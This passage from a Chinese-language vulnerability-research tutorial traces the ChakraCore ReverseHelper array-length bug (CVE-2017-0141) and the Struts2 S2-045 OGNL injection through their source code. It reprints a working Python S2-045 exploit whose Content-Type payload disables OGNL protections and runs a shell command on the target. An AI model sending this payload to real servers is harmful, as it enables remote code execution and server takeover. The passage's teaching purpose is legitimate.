    /* Save the DB on disk. Return C_ERR on error, C_OK on success. */
    int rdbSave(char *filename, rdbSaveInfo *rsi) {

</code></pre>
<p>然后回去看<code>saveCommand()</code> 的源码,filename 其实是server.rdb_filename</p>
<pre><code class="language-c">
    if (rdbSave(server.rdb_filename,rsiptr) == C_OK) {

</code></pre>
<h2 id="从一个漏洞commit-到理解这一类的漏洞挖掘方式"><a class="header" href="#从一个漏洞commit-到理解这一类的漏洞挖掘方式">从一个漏洞Commit 到理解这一类的漏洞挖掘方式</a></h2>
<p>本节从一个Chakra 的Bug Commit : [CVE-2017-0141] ReverseHelper Heap Overflow ,Link https://github.com/Microsoft/ChakraCore/commit/db504eba489528434dfb56257b0f202209741fe9 .和读者们分享一下如何从阅读源码的层面上对JavaScript 的OOB 漏洞挖掘的一些思路.</p>
<p><img src="pic4/reversehelper_commit.png" alt="" /></p>
<p>看到diff 知道代码修复的位置,现在我们到Source Insight 里面找找.找到这个按钮</p>
<p><img src="pic4/function_list.png" alt="" /></p>
<p>现在在搜素里面找ReverseHelper ,Source Insight 能找到这个函数</p>
<p><img src="pic4/function_list2.png" alt="" /></p>
<p>双击这里之后,就跳到了ReverseHelper ,我们在看看函数列表这里</p>
<p><img src="pic4/function_list1.png" alt="" /></p>
<p>是不是看到了很多其他的函数,这些函数就是Chakra 的JavaScript 内部对象的实现函数.要触发ReverseHelper 函数的调用,可以构造如下的代码.</p>
<pre><code class="language-javascript">
    data = Array();

    data.reverse();

</code></pre>
<p>注意,<strong>Chakra 是在底层上实现内部对象函数的,V8 是在Native JavaScript 上实现内部对象函数的</strong>.</p>
<p>让我们回来继续分析漏洞成因.由于代码一直有变化,patch 了的代码和原来Commit 的位置已经不同了,不过没有关系,能定位到就好.</p>
<p><img src="pic4/reversehelper_commit1.png" alt="" /></p>
<p>pArr 到底是什么东西呢,我们来查看它的定义</p>
<p><img src="pic4/find_parr.png" alt="" /></p>
<p><img src="pic4/find_parr1.png" alt="" /></p>
<p><code>ReverseHelper()</code> 的声明如下:</p>
<pre><code class="language-c++">
    Var JavascriptArray::ReverseHelper(JavascriptArray* pArr, Js::TypedArrayBase* typedArrayBase, RecyclableObject* obj, T length, ScriptContext* scriptContext)

</code></pre>
<p>现在我们找到了pArr 和length 的来源了.来看看<code>ReverseHelper()</code> 被哪些地方引用到</p>
<p><img src="pic4/reversehelper_references.png" alt="" /></p>
<pre><code>
    JavascriptArray.cpp (lib\runtime\library):            JS_REENTRANT_UNLOCK(jsReentLock, return JavascriptArray::ReverseHelper(pArr, nullptr, obj, length.GetSmallIndex(), scriptContext));
    JavascriptArray.cpp (lib\runtime\library):        JS_REENTRANT_UNLOCK(jsReentLock, return JavascriptArray::ReverseHelper(pArr, nullptr, obj, length.GetBigIndex(), scriptContext));
    JavascriptArray.cpp (lib\runtime\library):    Var JavascriptArray::ReverseHelper(JavascriptArray* pArr, Js::TypedArrayBase* typedArrayBase, RecyclableObject* obj, T length, ScriptContext* scriptContext)
    JavascriptArray.h (lib\runtime\library):        static Var ReverseHelper(JavascriptArray* pArr, Js::TypedArrayBase* typedArrayBase, RecyclableObject* obj, T length, ScriptContext* scriptContext);
    TypedArray.cpp (lib\runtime\library):        return JavascriptArray::ReverseHelper(nullptr, typedArrayBase, typedArrayBase, typedArrayBase-&gt;GetLength(), scriptContext);

</code></pre>
<p>我们搜素当前的源码文件的那两个引用.最后定位到<code>JavascriptArray::EntryReverse()</code></p>
<pre><code class="language-c++">
    Var JavascriptArray::EntryReverse(RecyclableObject* function, CallInfo callInfo, ...)  //  在Chakra 中,内部对象处理函数都长这样
    /*
      注意:Chakra 的内部函数调用原理是这样的:callInfo 传递给函数调用的参数列表.里面包含了当前对象和函数参数对象列表,callInfo[0] 是当前对象,callInfo[1] 往后就是函数参数列表
    */
    {
        PROBE_STACK(function-&gt;GetScriptContext(), Js::Constants::MinStackDefault);

        ARGUMENTS(args, callInfo);  //  格式化callInfo 成args
        ScriptContext* scriptContext = function-&gt;GetScriptContext();
        JS_REENTRANCY_LOCK(jsReentLock, scriptContext-&gt;GetThreadContext());

        Assert(!(callInfo.Flags &amp; CallFlags_New));

        if (args.Info.Count == 0)  //  无法获取当前的Array 对象
        {
            JavascriptError::ThrowTypeError(scriptContext, JSERR_This_NullOrUndefined, _u(&quot;Array.prototype.reverse&quot;));
        }

        BigIndex length = 0u;  //  注意,这个就是传递到ReverseHelper() 的length
        JavascriptArray* pArr = nullptr;
        RecyclableObject* obj = nullptr;

        JS_REENTRANT(jsReentLock, TryGetArrayAndLength(args[0], scriptContext, _u(&quot;Array.prototype.reverse&quot;), &amp;pArr, &amp;obj, &amp;length));  //  从当前的Array 对象中获取信息,其中包含了数组长度,Array 指针

        if (length.IsSmallIndex())
        {
            JS_REENTRANT_UNLOCK(jsReentLock, return JavascriptArray::ReverseHelper(pArr, nullptr, obj, length.GetSmallIndex(), scriptContext));  //  调用ReverseHelper
        }
        Assert(pArr == nullptr || length.IsUint32Max()); // if pArr is not null lets make sure length is safe to cast, which will only happen if length is a uint32max

        JS_REENTRANT_UNLOCK(jsReentLock, return JavascriptArray::ReverseHelper(pArr, nullptr, obj, length.GetBigIndex(), scriptContext));  //  调用ReverseHelper
    }

</code></pre>
<p>再来看看<code>TryGetArrayAndLength()</code> 做了些什么</p>
<pre><code class="language-c++">
    template&lt;typename T&gt;
    void JavascriptArray::TryGetArrayAndLength(Var arg,
        ScriptContext *scriptContext,
        PCWSTR methodName,
        __out JavascriptArray** array,
        __out RecyclableObject** obj,
        __out T * length)
    {
        Assert(array != nullptr);
        Assert(obj != nullptr);
        Assert(length != nullptr);

        *array = JavascriptOperators::TryFromVar&lt;JavascriptArray&gt;(arg);
        if (*array &amp;&amp; !(*array)-&gt;IsCrossSiteObject())  //  判断Array 是否为跨站对象
        {
            #if ENABLE_COPYONACCESS_ARRAY
                JavascriptLibrary::CheckAndConvertCopyOnAccessNativeIntArray&lt;Var&gt;(*array);
            #endif

            *obj = *array;
            *length = (*array)-&gt;length;  //  返回的长度为真实的数组长度
        }
        else
        {
            if (!JavascriptConversion::ToObject(arg, scriptContext, obj))
            {
                JavascriptError::ThrowTypeError(scriptContext, JSERR_This_NullOrUndefined, methodName);
            }
            *length = OP_GetLength(*obj, scriptContext);  //  返回的长度为JavaScript 属性length 设置的值
            *array = nullptr;
        }
    }

</code></pre>
<p><code>IsCrossSiteObject()</code> 到底做了什么工作呢?读者可以自行搜素代码来阅读.</p>
<p><img src="pic4/cross_site_object.png" alt="" /></p>
<p>相信读者开始有一个疑问,<code>*length = (*array)-&gt;length;</code> 和<code>*length = OP_GetLength(*obj, scriptContext);</code> 到底有什么不同呢?<strong>理解它们两个差异,就可以理解JavaScript 关于数组越界的漏洞的成因</strong>.让我们再深入去了解它们背后的故事.</p>
<pre><code class="language-c++">
    class ArrayObject : public DynamicObject  //  lib/runtime/types/ArrayObject.h:18
    {
    protected:
        Field(uint32) length;


    class JavascriptArray : public ArrayObject  //  lib/runtime/library/JavascriptArray.h:94
    {

</code></pre>
<p>JavascriptArray 是继承ArrayObject 的,我们来看看JavascriptArray 的构造函数</p>
<pre><code class="language-c++">
    JavascriptArray::JavascriptArray(uint32 length, DynamicType * type)
        : ArrayObject(type, false, length)
    {
        Assert(JavascriptArray::Is(type-&gt;GetTypeId()));
        Assert(EmptySegment-&gt;length == 0 &amp;&amp; EmptySegment-&gt;size == 0 &amp;&amp; EmptySegment-&gt;next == NULL);
        InitArrayFlags(DynamicObjectFlags::InitialArrayValue);
        SetHeadAndLastUsedSegment(const_cast&lt;SparseArraySegmentBase *&gt;(EmptySegment));
    }

</code></pre>
<p>由此可知,JavascriptArray 初始化长度length 最后传递给ArrayObject 的构造函数.</p>
<pre><code class="language-c++">
    ArrayObject(DynamicType * type, bool initSlots = true, uint32 length = 0)
        : DynamicObject(type, initSlots), length(length)
    {

</code></pre>
<p>弄明白了<code>JavascriptArray-&gt;length</code> 之后,再来理解<code>OP_GetLength</code> .前面说过,Op_GetLength 是JavaScript 属性length 设置的值.现在我们来分析一下代码</p>
<pre><code class="language-c++">
    uint64 JavascriptArray::OP_GetLength(Var obj, ScriptContext *scriptContext)  //  lib/runtime/library/JavascriptArray.cpp:3025
    {
        if (scriptContext-&gt;GetConfig()-&gt;IsES6ToLengthEnabled())
        {
            // Casting to uint64 is okay as ToLength will always be &gt;= 0.
            return (uint64)JavascriptConversion::ToLength(JavascriptOperators::OP_GetLength(obj, scriptContext), scriptContext);
        }
        else
        {
            return (uint64)JavascriptConversion::ToUInt32(JavascriptOperators::OP_GetLength(obj, scriptContext), scriptContext);
        }
    }

</code></pre>
<p>这段代码里面有两个OP_GetLength ,分别是<code>JavascriptArray::OP_GetLength</code> 和<code>JavascriptOperators::OP_GetLength</code> ,他们需要的函数参数都是<code>Var obj</code> 和<code>ScriptContext *scriptContext</code> ,参数obj 的意思是当前对象,参数scriptContext 的意思是JavaScript 执行环境上下文.再去阅读<code>JavascriptOperators::OP_GetLength()</code></p>
<pre><code class="language-c++">
    Var JavascriptOperators::OP_GetLength(Var instance, ScriptContext* scriptContext)
    {
        return JavascriptOperators::OP_GetProperty(instance, PropertyIds::length, scriptContext);
    }

</code></pre>
<p>看到这里读者们应该理解了,OP_GetLength 就是读取对象属性length 的值,再看看<code>JavascriptOperators::OP_GetProperty()</code> 的代码</p>
<pre><code class="language-c++">
    Var JavascriptOperators::OP_GetProperty(Var instance, PropertyId propertyId, ScriptContext* scriptContext)
    {
        RecyclableObject* object = nullptr;
        if (FALSE == JavascriptOperators::GetPropertyObject(instance, scriptContext, &amp;object))  //  找不到对象的属性
        {
            if (scriptContext-&gt;GetThreadContext()-&gt;RecordImplicitException())
            {
                JavascriptError::ThrowTypeError(scriptContext, JSERR_Property_CannotGet_NullOrUndefined, scriptContext-&gt;GetPropertyName(propertyId)-&gt;GetBuffer());
            }
            else
            {
                return scriptContext-&gt;GetLibrary()-&gt;GetUndefined();  //  返回undefined 的值
            }
        }

        Var result = JavascriptOperators::GetPropertyNoCache(instance, object, propertyId, scriptContext);  //  拿到对象属性的值
        AssertMsg(result != nullptr, &quot;result null in OP_GetProperty&quot;);
        return result;
    }

</code></pre>
<p>聪明的你应该开始举一反三了,右键JavascriptOperators::OP_GetLength 搜素引用,开开心心挖漏洞.下面截个搜素引用结果的图</p>
<p><img src="pic4/find_get_length.png" alt="" /></p>
<p>挑一些引用到Length 引用的地方,大部分JavaScript 执行引擎的OOB 漏洞都是因为长度可以被控制产生的问题</p>
<p><img src="pic4/get_source.png" alt="" /></p>
<p><img src="pic4/set.png" alt="" /></p>
<p><img src="pic4/incorrect_using_script_object_attribute_Javascrip.png" alt="" /></p>
<h2 id="结合poc-和源码来理解这类漏洞的原理"><a class="header" href="#结合poc-和源码来理解这类漏洞的原理">结合PoC 和源码来理解这类漏洞的原理</a></h2>
<p>前面说了很多二进制(主要是C/C++ )的例子,现在来一个JAVA 库Struts2 的分析.以S2-045 为例子,从PoC 到触发漏洞的原理再深入理解WEB 类漏洞是怎么来挖的.我去百度了一个S2-045 的EXP .</p>
<pre><code class="language-python">
    import urllib2
    import sys
    from poster.encode import multipart_encode
    from poster.streaminghttp import register_openers

    def poc():
        register_openers()
        datagen, header = multipart_encode({&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)})  #  构造Post 数据包
        header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;
        header[&quot;Content-Type&quot;]=&quot;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&quot;  #  在Content-Type 中插入OGNL 利用代码
        request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)  #  发送EXP
        response = urllib2.urlopen(request)
        print response.read()

    poc()

</code></pre>
<p>从PoC 里我们得知,恶意代码是从<code>Content-Type</code> 里面传递到漏洞点执行的.翻了翻Issus ,找到当时修复的Diff ,Link:https://github.com/apache/struts/commit/b06dd50af2a3319dd896bf5c2f4972d2b772cf2b</p>
<p><img src="pic4/struts2_fix.png" alt="" /></p>
<p><img src="pic4/struts2_fix_diff.png" alt="" /></p>
<p>是不是觉得很神奇,是下面这句代码引发的血案</p>
<pre><code class="language-java">
    for (LocalizedMessage error : multiWrapper.getErrors()) {
        if (validation != null) {
            validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));

</code></pre>
<p>无论是WEB 还是二进制漏洞,本质上都是找到一个可以做到远程代码执行的地方.二进制里大多数的远程代码执行漏洞都是由于内存操作不当而引起的(想了解更多关于二进制因内存操作不当导致的远程代码执行的知识,请到这里了解更多:https://github.com/lcatro/vuln_javascript ),但是不排除有因为函数调用没有正确过滤而导致的代码执行问题(参考CVE-2018-1000006 ,Commit:https://github.com/electron/electron/commit/c49cb29ddf3368daf279bd60c007f9c015bc834c );WEB 里的漏洞基本上都是因为调用敏感函数的问题导致的安全问题,比如:system() 远程命令执行,eval() 一句话木马,mysql_query() 数据库注入和现在要介绍的OGNL 执行函数.<strong>如果没有对输入做校验和字符过滤,很有可能会让用户的输入流到敏感函数,导致远程代码执行,服务器被Getshell</strong>.</p>
<p>现在回来看看上面的代码,到底哪儿出现了问题呢?我们先来阅读<code>LocalizedTextUtil.findText()</code> 的源码.在<code>core/src/main/java/com/opensymphony/xwork2/util/AbstractLocalizedTextProvider.java:194</code> 行</p>
<pre><code class="language-java">
    /**
     * &lt;p&gt;
     * Finds a localized text message for the given key, aTextName, in the specified resource
     * bundle.
     * &lt;/p&gt;
     *
     * &lt;p&gt;
     * If a message is found, it will also be interpolated.  Anything within &lt;code&gt;${...}&lt;/code&gt;
     * will be treated as an OGNL expression and evaluated as such.
     * &lt;/p&gt;
     *
     * &lt;p&gt;
     * If a message is &lt;b&gt;not&lt;/b&gt; found a WARN log will be logged.
     * &lt;/p&gt;
     *
     * @param bundle         the bundle
     * @param aTextName      the key
     * @param locale         the locale
     * @param defaultMessage the default message to use if no message was found in the bundle
     * @param args           arguments for the message formatter.
     * @param valueStack     the OGNL value stack.
     * @return the localized text, or null if none can be found and no defaultMessage is provided
     */
    @Override
    public String findText(ResourceBundle bundle, String aTextName, Locale locale, String defaultMessage, Object[] args,
                           ValueStack valueStack) {
        try {
            reloadBundles(valueStack.getContext());

            String message = TextParseUtil.translateVariables(bundle.getString(aTextName), valueStack);
            MessageFormat mf = buildMessageFormat(message, locale);

            return formatWithNullDetection(mf, args);
        } catch (MissingResourceException ex) {
            if (devMode) {
                LOG.warn(&quot;Missing key [{}] in bundle [{}]!&quot;, aTextName, bundle);
            } else {
                LOG.debug(&quot;Missing key [{}] in bundle [{}]!&quot;, aTextName, bundle);
            }
        }

        GetDefaultMessageReturnArg result = getDefaultMessage(aTextName, locale, valueStack, args, defaultMessage);
        if (unableToFindTextForKey(result)) {
            LOG.warn(&quot;Unable to find text for key '{}' in ResourceBundles for locale '{}'&quot;, aTextName, locale);
        }
        return result != null ? result.message : null;
    }

</code></pre>
<p>看到这里是不是懵逼了.我们一个个函数点进去看看,究竟都有些什么东西,但是限于篇幅,我就不全部把代码贴上来了,现在只放出一个关键函数的代码</p>
<pre><code class="language-java">
    /**
     * @return the default message.
     */
    protected GetDefaultMessageReturnArg getDefaultMessage(String key, Locale locale, ValueStack valueStack, Object[] args,
                                                                String defaultMessage) {
        GetDefaultMessageReturnArg result = null;
        boolean found = true;

        if (key != null) {
            String message = findDefaultText(key, locale);

            if (message == null) {
                message = defaultMessage;
                found = false; // not found in bundles
            }

            // defaultMessage may be null
            if (message != null) {
                MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);

                String msg = formatWithNullDetection(mf, args);
                result = new GetDefaultMessageReturnArg(msg, found);
            }
        }

        return result;
    }

</code></pre>
<p>还是使用上面的方式,一个个函数点进去看看,我们无需要对每个细节都要完全理解,但是要知道做了些什么,读者们可以通过函数名或者函数的逻辑来推断出来到底发生了什么事.继续往下探索,找到<code>translateVariables()</code> 的声明.</p>
<pre><code class="language-java">
    /**
     * Converts all instances of ${...}, and %{...} in &lt;code&gt;expression&lt;/code&gt; to the value returned
     * by a call to {@link ValueStack#findValue(java.lang.String)}. If an item cannot
     * be found on the stack (null is returned), then the entire variable ${...} is not
     * displayed, just as if the item was on the stack but returned an empty string.
     *
     * @param expression an expression that hasn't yet been translated
     * @param stack value stack
     * @return the parsed expression
     */
    public static String translateVariables(String expression, ValueStack stack) {
        return translateVariables(new char[]{'$', '%'}, expression, stack, String.class, null).toString();
    }

</code></pre>
<p>??? ,这个函数居然是执行OGNL 表达式的.我们再一路往下找.</p>
<pre><code class="language-java">
    //  经过多个重载之后..

    /**
     * Converted object from variable translation.
     *
     * @param openChars open character array
     * @param expression expression string
     * @param stack value stack
     * @param asType as class type
     * @param evaluator value evaluator
     * @param maxLoopCount max loop count
     * @return Converted object from variable translation.
     */
    public static Object translateVariables(char[] openChars, String expression, final ValueStack stack, final Class asType, final ParsedValueEvaluator evaluator, int maxLoopCount) {

        ParsedValueEvaluator ognlEval = new ParsedValueEvaluator() {
            public Object evaluate(String parsedValue) {
                Object o = stack.findValue(parsedValue, asType);
                if (evaluator != null &amp;&amp; o != null) {
                    o = evaluator.evaluate(o.toString());
                }
                return o;
            }
        };

        TextParser parser = ((Container)stack.getContext().get(ActionContext.CONTAINER)).getInstance(TextParser.class);

        return parser.evaluate(openChars, expression, ognlEval, maxLoopCount);  //  执行OGNL 表达式
    }

</code></pre>
<p>现在可以确定,<code>TextParseUtil.translateVariables()</code> 可以执行OGNL 表达式.参数1 是OGNL 表达式字符串,参数2 是值栈.知道这点之后,回来阅读这里的代码</p>
<pre><code class="language-java">
    protected GetDefaultMessageReturnArg getDefaultMessage(String key, Locale locale, ValueStack valueStack, Object[] args,
                                                                String defaultMessage) {
        GetDefaultMessageReturnArg result = null;
        boolean found = true;

        if (key != null) {
            String message = findDefaultText(key, locale);

            if (message == null) {
                message = defaultMessage;
                found = false; // not found in bundles
            }

            // defaultMessage may be null
            if (message != null) {
                MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);

</code></pre>
<p>也就是说,getDefaultMessage() 函数的defaultMessage 参数是可以执行OGNL 表达式的,而且defaultMessage 是由findText() 传递过来的.咱们还是去查查Strust2 的官方文档一探究竟.Link :https://struts.apache.org/maven/struts2-core/apidocs/index.html</p>
<p><img src="pic4/document.png" alt="" /></p>
<p>官方文档竟然没有关于参数的介绍,那没关系,我们去找<code>LocalizedTextUtil.findText()</code></p>
<p><img src="pic4/document1.png" alt="" /></p>
<p>??? .兄弟,这是几个意思?看来你这样要为难我小叮当啊.然后在谷歌百度胡乱搜了一下,结果找到了.</p>
<p><img src="pic4/document2.png" alt="" /></p>
<p>好了,LocalizedTextUtil.findText() 的defaultMessage 参数既然可以执行OGNL 语句,那么我们再来看看Diff 的代码</p>
<pre><code class="language-java">
    for (LocalizedMessage error : multiWrapper.getErrors()) {
        if (validation != null) {
            validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));

</code></pre>
<p>居然是把一个错误提示信息拿来做参数,来看看LocalizedMessage 和multiWrapper.getErrors() 是什么</p>
<pre><code class="language-java">
    HttpServletRequest request = (HttpServletRequest) ac.get(ServletActionContext.HTTP_REQUEST);

    if (!(request instanceof MultiPartRequestWrapper)) {  //  如果request 不是MultiPartRequestWrapper 的示例,那就继续往下执行
        if (LOG.isDebugEnabled()) {
            ActionProxy proxy = invocation.getProxy();
            LOG.debug(getTextMessage(&quot;struts.messages.bypass.request&quot;, new String[]{proxy.getNamespace(), proxy.getActionName()}));
        }

        return invocation.invoke();  //  执行下一个invocation
    }

    // ...

    MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper) request;  //  获取Post Data 部分

    if (multiWrapper.hasErrors() &amp;&amp; validation != null) {
        TextProvider textProvider = getTextProvider(action);
        for (LocalizedMessage error : multiWrapper.getErrors()) {

</code></pre>
<p>看到这里,可能读者们开始迷惑了,当时我也一样,看到这个代码结果确实有些头晕,不知道自己看的代码究竟在哪一部分,这个时候,我们就应该去找一找架构图</p>
<p><img src="pic4/strust2_arch.png" alt="" /></p>
<p>看完了架构图之后,估计读者会分化为两部分了:瞬间明白整体原理和越看越懵逼的,我当时看这个架构图的时候就是属于越看越懵逼的那种哈哈哈.Struts2 是AOP (面向切面编程,意思是数据一层一层往上来处理,RASP 就是这个原理)模型.每个Interceptor 都对应不同的功能.触发漏洞的地方是在FileUploadInterceptor ,FileUploadInterceptor 是需要MultiPartRequestWrapper (对应MultiPartRequest)处理过的请求头,那么我们去找一下Struts2 关于MultiPartRequest 的请求,看看是在哪个Interceptor 里面处理的.现在我们看看Struts2 的Interceptor 的默认配置文件.代码位置<code>core/src/main/resources/struts-default.xml</code> ,Link : https://github.com/apache/struts/blob/a4439376b806fa73f96f469315d51ad83591b796/core/src/main/resources/struts-default.xml</p>
<pre><code class="language-xml">
    &lt;bean type=&quot;org.apache.struts2.dispatcher.multipart.MultiPartRequest&quot; name=&quot;jakarta&quot; class=&quot;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest&quot; scope=&quot;prototype&quot;/&gt;
    &lt;bean type=&quot;org.apache.struts2.dispatcher.multipart.MultiPartRequest&quot; name=&quot;jakarta-stream&quot; class=&quot;org.apache.struts2.dispatcher.multipart.JakartaStreamMultiPartRequest&quot; scope=&quot;prototype&quot;/&gt;

</code></pre>
<p>原来MultiPartRequest 使用JakartaMultiPartRequest 和JakartaStreamMultiPartRequest 来做处理.那么现在看看MultiPartRequestWrapper 类的构造函数,Link :https://github.com/apache/struts/blob/6e96f11debc4fa52c65a12b28fea82b514b96abd/core/src/main/java/org/apache/struts2/dispatcher/multipart/MultiPartRequestWrapper.java</p>
<pre><code class="language-java">
    /**
     * Process file downloads and log any errors.
     *
     * @param multiPartRequest Our MultiPartRequest object
     * @param request Our HttpServletRequest object
     * @param saveDir Target directory for any files that we save
     * @param provider locale provider
     * @param disableRequestAttributeValueStackLookup disable the request attribute value stack lookup
     */
    public MultiPartRequestWrapper(MultiPartRequest multiPartRequest, HttpServletRequest request,
                                   String saveDir, LocaleProvider provider,
                                   boolean disableRequestAttributeValueStackLookup) {
        super(request, disableRequestAttributeValueStackLookup);
        errors = new ArrayList&lt;&gt;();
        multi = multiPartRequest;  //  multi 是初始化MultiPartRequestWrapper 传递进来的MultiPartRequest
        defaultLocale = provider.getLocale();
        setLocale(request);
        try {
            multi.parse(request, saveDir);  //  注意,解析request 请求头数据
            for (LocalizedMessage error : multi.getErrors()) {
                addError(error);
            }
        } catch (IOException e) {
            LOG.warn(e.getMessage(), e);
            addError(buildErrorMessage(e, new Object[] {e.getMessage()}));
        }
    }

</code></pre>
<p>我们来看看Struts2 的文件上传部分.Link :https://github.com/apache/struts/blob/6e96f11debc4fa52c65a12b28fea82b514b96abd/core/src/main/java/org/apache/struts2/dispatcher/filter/StrutsPrepareAndExecuteFilter.java</p>
<pre><code class="language-java">
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {

        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        try {
            String uri = RequestUtils.getUri(request);
            if (excludedPatterns != null &amp;&amp; prepare.isUrlExcluded(request, excludedPatterns)) {
                LOG.trace(&quot;Request {} is excluded from handling by Struts, passing request to other filters&quot;, uri);
                chain.doFilter(request, response);
            } else {
                LOG.trace(&quot;Checking if {} is a static resource&quot;, uri);
                boolean handled = execute.executeStaticResourceRequest(request, response);
                if (!handled) {
                    LOG.trace(&quot;Assuming uri {} as a normal action&quot;, uri);
                    prepare.setEncodingAndLocale(request, response);
                    prepare.createActionContext(request, response);
                    prepare.assignDispatcherToThread();
                    request = prepare.wrapRequest(request);  //  解析请求头
                    ActionMapping mapping = prepare.findActionMapping(request, response, true);
                    if (mapping == null) {
                        LOG.trace(&quot;Cannot find mapping for {}, passing to other filters&quot;, uri);
                        chain.doFilter(request, response);
                    } else {
                        LOG.trace(&quot;Found mapping {} for {}&quot;, mapping, uri);
                        execute.executeAction(request, response, mapping);
                    }
                }
            }
        } finally {
            prepare.cleanupRequest(request);
        }
    }

    public HttpServletRequest wrapRequest(HttpServletRequest oldRequest) throws ServletException {
        HttpServletRequest request = oldRequest;
        try {
            // Wrap request first, just in case it is multipart/form-data
            // parameters might not be accessible through before encoding (ww-1278)
            request = dispatcher.wrapRequest(request);  //  wrapRequest()
            ServletActionContext.setRequest(request);
        } catch (IOException e) {
            throw new ServletException(&quot;Could not wrap servlet request with MultipartRequestWrapper!&quot;, e);
        }
        return request;
    }

    public HttpServletRequest wrapRequest(HttpServletRequest request) throws IOException {
        // don't wrap more than once
        if (request instanceof StrutsRequestWrapper) {
            return request;
        }

        String content_type = request.getContentType();
        if (content_type != null &amp;&amp; content_type.contains(&quot;multipart/form-data&quot;)) {  //  根据Content_Type 的内容来判断是否选择MultiPartRequestWrapper
            MultiPartRequest mpr = getMultiPartRequest();
            LocaleProvider provider = getContainer().getInstance(LocaleProvider.class);
            request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);
        } else {
            request = new StrutsRequestWrapper(request, disableRequestAttributeValueStackLookup);
        }

        return request;
    }

</code></pre>
<p>搞明白了Content-Type 为什么需要带上multipart/form-data 之后.再回过头来看漏洞描述,这个问题的触发点在JakartaStreamMultiPartRequest 这里.现在去找<code>JakartaStreamMultiPartRequest.parse()</code> 函数的实现代码.Link :https://github.com/apache/struts/blob/6e96f11debc4fa52c65a12b28fea82b514b96abd/core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java</p>
<pre><code class="language-java">
    public void parse(HttpServletRequest request, String saveDir) throws IOException {
        try {
            setLocale(request);
            processUpload(request, saveDir);  //  处理上传请求
        } catch (Exception e) {
            LOG.warn(&quot;Error occurred during parsing of multi part request&quot;, e);
            LocalizedMessage errorMessage = buildErrorMessage(e, new Object[]{});  //  保存错误消息
            if (!errors.contains(errorMessage)) {
                errors.add(errorMessage);
            }
        }
    }

</code></pre>
<p>在此就不再往下分析了,最后会触发一个异常,让Content-Type 里面的值保存到errors 对象中</p>
<pre><code class="language-java">
    public abstract class AbstractMultiPartRequest implements MultiPartRequest {

        protected List&lt;LocalizedMessage&gt; errors = new ArrayList&lt;&gt;();

        public List&lt;LocalizedMessage&gt; getErrors() {  //  获取errors 的信息..
            return errors;
        }

</code></pre>
<p>最后,我们回来看看patch 的代码</p>
<pre><code class="language-java">
    for (LocalizedMessage error : multiWrapper.getErrors()) {
        if (validation != null) {
            validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));

</code></pre>
<p>此时,由于Content-Type 的值导致Struts2 的JakartaStreamMultiPartRequest 解析异常,异常信息保存在<code>multiWrapper.getErrors()</code> 里,<code>LocalizedMessage error</code> 里面的还带有Content-Type 的值.这个内容传递到了<code>LocalizedTextUtil.findText()</code> ,这个地方是可以执行OGNL 语句的.那么我们在Content-Type 里面插入了OGNL 语句之后,触发异常,让Content-Type 的值保存到异常信息传递给<code>LocalizedTextUtil.findText()</code>,<code>LocalizedTextUtil.findText()</code> 执行了我们注入的OGNL 语句,引发了远程代码执行.</p>
<h2 id="结尾-1"><a class="header" href="#结尾-1">结尾</a></h2>
<p>读代码时比较迷惘,可以尝试换一个地方从新来读;读代码时比较迷惘,可以尝试谷歌百度搜素一下其他人的分析和用法;读代码时比较迷惘,可以尝试看看官方文档;读代码时比较迷惘,可以尝试换个歌单听一听.<strong>切记!不要烦躁</strong></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="7-程序编译原理"><a class="header" href="#7-程序编译原理">7. 程序编译原理</a></h1>
<ul>
<li><a href="5.compile.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="5.compile.html#%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86">二进制编译原理</a>
<ul>
<li><a href="5.compile.html#ast-%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91">AST (抽象语法树)</a></li>
<li><a href="5.compile.html#%E6%B1%87%E7%BC%96">汇编</a></li>
<li><a href="5.compile.html#%E9%93%BE%E6%8E%A5">链接</a></li>
</ul>
</li>
<li><a href="5.compile.html#%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86">脚本语言运行原理</a>
<ul>
